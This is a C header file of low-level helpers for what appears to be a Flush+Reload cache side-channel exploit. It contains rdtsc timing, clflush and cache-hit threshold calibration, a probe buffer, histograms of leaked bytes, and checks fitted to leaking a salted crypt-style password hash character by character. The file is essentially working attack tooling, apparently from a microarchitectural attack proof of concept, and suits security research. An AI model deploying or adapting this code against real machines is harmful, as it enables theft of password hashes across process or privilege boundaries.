#ifndef _UTIL_H_
#define _UTIL_H_

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>


#define SECRET_LEN 124
#define CACHE_LINE_LEN 64
#define SALT_MAX_LEN 16
#define SALT_START_INDEX 8

#define BUF_SIZE 256
#define STRIDE 4096
#define BUF_TOTAL (BUF_SIZE * STRIDE)

#define FROM '$'//0x24
#define TO 'z'//0x7a
#define DUMMY_HIT (FROM-1)

int CACHE_MISS_THRESHOLD = 150;

char invalid_leaks[20][3];
int invalid_leaks_count;

inline __attribute__((always_inline)) uint64_t rdtsc() {
    uint64_t a, d;
    asm volatile("mfence");
    asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

inline __attribute__((always_inline)) void flush(unsigned char *p) {
    asm volatile("clflush (%0)\n" :: "r"(p));
}

inline __attribute__((always_inline)) void maccess(unsigned char *p) {
    asm volatile("movq (%0), %%rax\n" : : "r"(p) : "rax");
}

inline __attribute__((always_inline)) void maccess2(unsigned char *p) {
    asm volatile("movntdqa (%0), %%xmm1\n"
                 "movq %%xmm1, %%rax\n"
                 : : "c"(p) : "rax");
}

inline __attribute__((always_inline)) void mfence() {
    asm volatile("mfence");
}


inline __attribute__((always_inline)) int rdtsc_access(unsigned char *addr) {
    volatile unsigned long time;
    asm volatile(
    "  mfence             \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  lfence             \n"
    "  movq %%rax, %%rsi  \n"
    "  movq (%1), %%rax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subq %%rsi, %%rax  \n"
    : "=a" (time)
    : "c" (addr)
    :  "%rsi", "%rdx"
    );
    return time;
}

inline __attribute__((always_inline)) int time_flush_reload(unsigned char *ptr) {
  int time = rdtsc_access(ptr);

  flush(ptr);

  return time;
}

inline __attribute__((always_inline)) int time_mem_access(unsigned char *ptr) {
  int time = rdtsc_access(ptr);

  mfence();

  return time;
}

void flush_buffer(unsigned char *buf) {
  for(int i=0; i<BUF_SIZE; i++) {
        flush(buf + i * STRIDE);
    }
}

inline __attribute__((always_inline)) int valid_char(unsigned char c) {
    switch(c) {
        case 'a':
        case 'b':
        case 'c':
        case 'd':
        case 'e':
        case 'f':
        case 'g':
        case 'h':
        case 'i':
        case 'j':
        case 'k':
        case 'l':
        case 'm':
        case 'n':
        case 'o':
        case 'p':
        case 'q':
        case 'r':
        case 's':
        case 't':
        case 'u':
        case 'v':
        case 'w':
        case 'x':
        case 'y':
        case 'z':
        case 'A':
        case 'B':
        case 'C':
        case 'D':
        case 'E':
        case 'F':
        case 'G':
        case 'H':
        case 'I':
        case 'J':
        case 'K':
        case 'L':
        case 'M':
        case 'N':
        case 'O':
        case 'P':
        case 'Q':
        case 'R':
        case 'S':
        case 'T':
        case 'U':
        case 'V':
        case 'W':
        case 'X':
        case 'Y':
        case 'Z':
        case '0':
        case '1':
        case '2':
        case '3':
        case '4':
        case '5':
        case '6':
        case '7':
        case '8':
        case '9':
        case '.':
        case '/':

        // additionally needed
        case ':':
        case '$':
            return 1;
    }

    return 0;
}

int detect_flush_reload_threshold(unsigned char *buf) {
    int mem_access_time = 0;
    int fr_time = 0;
    unsigned char *ptr = buf + BUF_TOTAL/2;
    int count = 1000000;

  
    maccess(ptr);
    for (int i = 0; i < count; i++) {
        mem_access_time += time_mem_access(ptr);
    }


    flush(ptr);
    for (int i = 0; i < count; i++) {
        fr_time += time_flush_reload(ptr);
    }
    mem_access_time /= count;
    fr_time /= count;



    return (fr_time + mem_access_time * 2) / 3;
}

void test_access_times(unsigned char *buf) {
    for(int i=0; i<BUF_TOTAL; i++) {
        flush(&buf[i]);
    }

    for (int i = 0; i < 100; i++) {
        // Alternate: Cache, RAM, Cache, RAM ...
        if (i % 2 == 0) {
            flush(&buf[0]);
            printf("R: ");
        } else {
            printf("C: ");
        }
        size_t time = time_mem_access(&buf[0]);
        printf("%ld %d\n", time, time < CACHE_MISS_THRESHOLD);
    }
}

void test_fr(unsigned char *buf, unsigned char byte) {
    flush_buffer(buf);

    maccess(buf + byte * STRIDE);

    for(int i=0; i<BUF_SIZE; i++) {
        int time = time_flush_reload(buf + i * STRIDE);
        printf("%3d: %d\n", i, time < CACHE_MISS_THRESHOLD);
    }
}

void print_hist_single(int* histogram, int number, int max_tries) {
    int hits = 0;
    printf("## index: %d\n", number);
    for(int i=DUMMY_HIT; i<=TO; i++) {
        if(histogram[i]) {
            printf("0x%2x %c %6d hits\n", i, i, histogram[i]);
            hits += histogram[i];
        } else {
            printf("0x%2x %c %6s hits\n", i, i, "-");
        }
    }
    printf("Total hits in histo: %d - %3.2f%% of all mem accesses\n", hits, (float)(hits/(float)max_tries * 100));
    // printf("Hits not on dummy: %d\n", hits-histogram[DUMMY_HIT]);
    printf("\n");
}

/*
 * Check whether the first 2 reverse leaked bytes are invalid
 * Used in phase 2.
 */
static inline __attribute__((always_inline)) int invalid_reverse_leak(
    unsigned char *secret,
    int index,
    int leaked_bytes) {
    if(leaked_bytes >= 2) {
        for(int i=0; i<invalid_leaks_count; i++) {
            char *bad_string = invalid_leaks[i];
            if(secret[index] == bad_string[0] && secret[index+1] == bad_string[1]) {
                printf("Invalid leak: %s\n", bad_string);
                return 0;
            }
        }
    }
    return 1;
}

int get_salt_len(unsigned char *secret) {
    int count = 0;
    for(int i=SALT_START_INDEX; i<=SALT_START_INDEX+SALT_MAX_LEN; i++) {
        if(secret[i] == '$') {
            break;
        }
        count++;
    }
    return count;
}

void add_invalid_leak(unsigned char c0, unsigned char c1) {
    invalid_leaks[invalid_leaks_count][0] = c0;
    invalid_leaks[invalid_leaks_count][1] = c1;
    printf("Added to invalid leaks: %s\n", invalid_leaks[invalid_leaks_count]);
    invalid_leaks_count++;
}

#endif
